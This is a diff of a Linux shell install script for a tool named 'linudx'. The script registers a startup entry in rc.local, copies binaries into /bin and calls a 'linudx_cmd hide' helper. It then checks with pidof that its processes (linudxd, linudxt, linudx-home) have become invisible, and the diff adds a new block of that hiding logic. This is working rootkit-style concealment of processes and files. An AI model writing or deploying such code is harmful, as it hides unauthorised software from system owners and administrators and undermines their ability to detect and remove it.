@@ -34,20 +34,21 @@ fi
 #uninstall start
 sed -i '\/bin\/linudx-startup.sh/d' /etc/rc.d/rc.local
 
-#kill -9 `cat /bin/linudx-pids`
+#show###############################
 /linudx/linudx_cmd show
-
-if [ "`pidof linudxd`" ];then
-  echo "show linudxd success check one"
+if [ "`pidof linudx-home`" ];then
+  echo "show linudx-home success check one"
 else
   /linudx/linudx_cmd show
 fi
 
-if [ "`pidof linudxd`" ];then
-  echo "show linudxd success check two" 
+if [ "`pidof linudx-home`" ];then
+  echo "show linudx-home success check two" 
 else
-  echo "show linudxd failed"
+  echo "show linudx-home failed"
 fi
+#show end###########################
+
   
 killall linudxd
 killall linudxt
@@ -59,6 +60,7 @@ rm -rf /bin/linudx-home
 rm -rf /bin/linudx-update.sh
 rm -rf /bin/linudx-ver.txt
 rm -rf /bin/linudx-startup.sh
+
 #uninstall finish
 
 #copy files to /bin
@@ -87,21 +89,23 @@ p1=`pidof linudxd`
 p2=`pidof linudxt`
 p3=`pidof linudx-home`
 
+#hide###########################
+/linudx/linudx_cmd hide
+if [ "`pidof linudx-home`" ];then
+  /linudx/linudx_cmd hide 
+else
+  echo "hide linudx-home success check1"
+fi
+
+if [ "`pidof linudx-home`" ];then
+  echo "hide linudx-home failed" 
+else
+  echo "hide linudx-home success check2"
+fi
+#hide end########################
+
 #hide pid and files
 /linudx/linudx_cmd hide $p1
 /linudx/linudx_cmd hide $p2
 /linudx/linudx_cmd hide $p3
 
-if [ "`pidof linudxd`" ];then
-  /linudx/linudx_cmd hide   
-else
-  echo "hide success one"
-fi
-
-if [ "`pidof linudxd`" ];then
-  echo "hide failed"
-else
-  echo "hide success two" 
-fi
-sleep 1
-#echo "$p1 $p2 $p3" > /bin/linudx-pids
